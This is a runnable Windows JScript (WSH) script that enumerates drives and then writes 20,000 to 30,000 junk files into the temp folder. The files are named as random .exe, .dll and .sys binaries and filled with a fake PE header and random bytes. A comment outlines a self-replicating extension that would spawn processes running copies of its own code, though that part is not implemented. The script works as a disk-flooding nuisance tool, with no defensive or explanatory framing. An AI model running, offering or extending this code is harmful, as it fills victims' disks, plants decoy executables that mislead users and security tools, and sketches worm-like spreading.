function Filler() {
    this.filecount = 0;
};

Filler.prototype.getDrives = function() {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');
    var e = new Enumerator(fso.Drives);
    var res = '';

    for (; !e.atEnd(); e.moveNext()) {
        var x = e.item();

        if (x.isReady) {
            var details = {
                availableSpace: this.bytesToHuman(x.AvailableSpace),
                driveLetter: x.DriveLetter,
                driveType: this.getDriveType(x.driveType),
                fileSystem: x.fileSystem,
                freeSpace: this.bytesToHuman(x.freeSpace),
                isReady: x.isReady,
                path: x.Path,
                rootFolder: x.rootFolder,
                serialNumber: (x.serialNumber + 0x100000000).toString(0x10),
                shareName: x.shareName,
                totalSize: this.bytesToHuman(x.totalSize),
                volumeName: x.volumename
            };

            res += 'Drive ready:\n';
            for (var i in details) {
                if (details[i] !== '') res += i + ': ' + details[i] + ',\n';
            }
        } else {
            var details = {}
            try {details.availableSpace = x.availableSpace}catch(err){};
            try {details.driveLetter = x.driveLetter}catch(err){};
            try {details.driveType = this.getDriveType(x.driveType)}catch(err){};
            try {details.fileSystem = x.fileSystem}catch(err){};
            try {details.freeSpace = x.freeSpace}catch(err){};
            try {details.isReady = x.isReady}catch(err){};
            try {details.path = x.Path}catch(err){};
            try {details.rootFolder = x.rootFolder}catch(err){};
            try {details.serialNumber = x.serialNumber}catch(err){};
            try {details.shareName = x.shareName}catch(err){};
            try {details.totalSize = x.totalSize}catch(err){};
            try {details.volumeName = x.volumeName}catch(err){};

            res += 'Drive not ready:\n';
            for (var i in details) {
                if (details[i] !== '') res += i + ': ' + details[i] + ',\n';
            }
        }

        res += '\n\n';
    }

    return res;
};

Filler.prototype.getDriveType = function(type) {
    var res = 'Unknown';

    switch (type) {
        case 0:
        default:
            res = 'Unknown';
            break;
        case 1:
            res = 'Removable';
            break;
        case 2:
            res = 'Fixed';
            break;
        case 3:
            res = 'Network';
            break;
        case 4:
            res = 'CD-ROM';
            break;
        case 5:
            res = 'RAM Disk';
            break;
    }

    return res;
};

Filler.prototype.createFile = function(filename, path) {
    var fso = WScript.CreateObject('Scripting.FileSystemObject');

    filename = filename || this.getRandomFilename();
    path = path ? fso.getFolder(fso.getAbsolutePathName(path)) : fso.GetSpecialFolder(2);

    path.createTextFile(filename, true);

    return fso.getAbsolutePathName(path + '\\' + filename);
};

Filler.prototype.writeFileContents = function(filepath) {
    var stream = WScript.CreateObject('ADODB.Stream');
    var contents = this.getRandomBytes(0x400 + Math.ceil(Math.random() * 0x4000));

    stream.open();
    stream.type = 2;

    var contentArr = contents.split('');
    for (var i = 0; i < contentArr.length; i++) {
        stream.writeText(contentArr[i]);
    }
    stream.position = 0;
    stream.saveToFile(filepath, 2);
    stream.close();

    return contents.length;
};

Filler.prototype.getRandomFilename = function() {
    return 'rad' + [
        Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase(),
        Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase(),
        Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase(),
        Math.floor(Math.random() * 0xffffffff).toString(16).toUpperCase(),
        Math.floor(Math.random() * 0xfffff).toString(16).toUpperCase()
    ].join('') + ['.exe','.dll','.sys'][Math.floor(Math.random() * 3)];
}

Filler.prototype.getRandomBytes = function(length) {
    length = length || 1024;

    // Fake PE header
    var output = [0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];

    for (var i = 0; i < length; i++) {
        output.push(Math.floor(Math.random() * 0xff));
    }

    return String.fromCharCode.apply(null, output);
};


Filler.prototype.bytesToHuman = function(bytes) {
    if (bytes < 0x400) {
        return bytes + ' bytes';
    } else if (bytes < 0x100000) {
        return Math.floor(bytes / 0x400) + ' kb';
    } else if (bytes < 0x40000000) {
        return Math.floor(bytes / 0x100000) + ' mb';
    } else if (bytes < 0x10000000000) {
        return Math.floor(bytes / 0x40000000) + ' gb';
    } else {
        return Math.floor(bytes / 0x10000000000) + ' tb';
    }
};

(function() {
    var filler = new Filler();

    /**
     * spawn several scripts:
     * - write file randomly to fs
     * - check if there are n processes
     * - if not, create random files with own code
     * - run newly created process and repeat
     *
     */
    var iter = 20000 + Math.ceil(Math.random() * 10000);
    var counter = 0;
    var size = 0;

    for (var i = 0; i < iter; i++) {
        try {
            var filename = filler.createFile();
            var clen = filler.writeFileContents(filename);
            // WScript.Echo('Written file ' + filename + ' (' + clen + ' bytes written)');
            counter++;
            size += clen;
        }catch(e){};
    }
    WScript.Echo('Created ' + counter + ' files with total size of ' + filler.bytesToHuman(size) + ' (' + (iter - counter) + ' files failed)');
})();
